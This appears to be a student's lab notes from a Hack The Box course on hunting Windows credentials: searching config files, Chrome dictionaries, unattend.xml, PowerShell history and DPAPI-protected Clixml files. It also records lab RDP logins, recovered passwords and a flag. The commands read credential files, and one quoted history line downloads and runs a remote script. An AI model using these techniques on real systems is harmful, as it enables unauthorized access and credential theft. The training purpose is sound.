# Credential Hunting

## Application Configuration Files

```
PS C:\htb> findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml
```

For the default IIS website, this could be located at C:\inetpub\wwwroot\web.config

## Dictionary Files

Chrome Dictionary Files

```
gc 'C:\Users\htb-student\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt' | Select-String password
Password1234!
```

## Unattended Installation Files

unattend.xml

```
<?xml version="1.0" encoding="utf-8"?>
<unattend xmlns="urn:schemas-microsoft-com:unattend">
    <settings pass="specialize">
        <component name="Microsoft-Windows-Shell-Setup" processorArchitecture="amd64" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" xmlns:wcm="http://schemas.microsoft.com/WMIConfig/2002/State" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
            <AutoLogon>
                <Password>
                    <Value>local_4dmin_p@ss</Value>
                    <PlainText>true</PlainText>
                </Password>
                <Enabled>true</Enabled>
                <LogonCount>2</LogonCount>
                <Username>Administrator</Username>
            </AutoLogon>
            <ComputerName>*</ComputerName>
        </component>
    </settings>
```

## PowerShell History File

Starting with Powershell 5.0 in Windows 10, PowerShell stores command history to the file:
C:\Users\<username>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt.

1) Confirming PowerShell History Save Path

```
(Get-PSReadLineOption).HistorySavePath

C:\Users\htb-student\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

2) Reading PowerShell History File

```
gc (Get-PSReadLineOption).HistorySavePath

dir
cd Temp
md backups
cp c:\inetpub\wwwroot\* .\backups\
Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://www.powershellgallery.com/packages/MrAToolbox/1.0.1/Content/Get-IISSite.ps1'))
. .\Get-IISsite.ps1
Get-IISsite -Server WEB02 -web "Default Web Site"
wevtutil qe Application "/q:*[Application [(EventID=3005)]]" /f:text /rd:true /u:WEB02\administrator /p:5erv3rAdmin! /r:WEB02
```

OR

```
foreach($user in ((ls C:\users).fullname)){cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue}

dir
cd Temp
md backups
cp c:\inetpub\wwwroot\* .\backups\
Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://www.powershellgallery.com/packages/MrAToolbox/1.0.1/Content/Get-IISSite.ps1'))
. .\Get-IISsite.ps1
Get-IISsite -Server WEB02 -web "Default Web Site"
wevtutil qe Application "/q:*[Application [(EventID=3005)]]" /f:text /rd:true /u:WEB02\administrator /p:5erv3rAdmin! /r:WEB02
```

## PowerShell Credentials

Decrypting PowerShell Credentials :

The credentials are protected using https://en.wikipedia.org/wiki/Data_Protection_API

It typically means they can only be decrypted by the same user on the same computer they were created on.

```
$credential = Import-Clixml -Path 'C:\scripts\pass.xml'
$credential.GetNetworkCredential().username
bob

$credential.GetNetworkCredential().password
Str0ng3ncryptedP@ss!
```

## LAB

xfreerdp /v:10.129.43.44 /u:htb-student /p:HTB_@cademy_stdnt!

findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml

--> Lot of AppData file

PS C:\Users\htb-student> gc 'C:\Users\htb-student\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt' | Select-String password

Password1234!

findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml

type 'Public\Documents\settings.xml'

cd c:\Users

  <proxies>
    <proxy>
      <id>myproxy</id>
      <active>true</active>
      <protocol>http</protocol>
      <host>proxy.inlanefreight.local</host>
      <port>8080</port>
      <username>proxyadmin</username>
      <password>Pr0xyadm1nPassw0rd!</password>
      <nonProxyHosts>*.google.com|ibiblio.org</nonProxyHosts>
    </proxy>
  </proxies>

xfreerdp /v:10.129.43.44 /u:bob /p:Str0ng3ncryptedP@ss!

PS C:\Scripts> $credential = Import-Clixml -Path 'C:\scripts\pass.xml'
PS C:\Scripts> $credential.GetNetworkCredential().username
bob
PS C:\Scripts> $credential.GetNetworkCredential().password
Str0ng3ncryptedP@ss!

flag.txt
3ncryt10n_w0nt_4llw@ys_s@v3_y0u

